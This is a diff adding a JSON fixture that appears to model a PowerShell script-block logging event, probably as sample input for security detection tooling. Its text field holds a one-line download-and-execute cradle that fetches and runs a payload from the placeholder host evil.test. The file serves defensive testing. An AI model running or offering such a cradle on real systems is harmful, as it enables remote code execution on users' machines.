@@ -1,0 +1,14 @@
+{
+  "type": "script_block",
+  "meta": {
+    "pid": 5120,
+    "ppid": 620,
+    "user": { "os": "windows", "sid": "S-1-5-21-1004336348-1177238915-682003330-512", "integrity_level": 12288 },
+    "timestamp_ns": 1756900040000000000,
+    "comm": "powershell.exe"
+  },
+  "script_block_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+  "text": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/payload.ps1')",
+  "message_number": 1,
+  "message_total": 1
+}
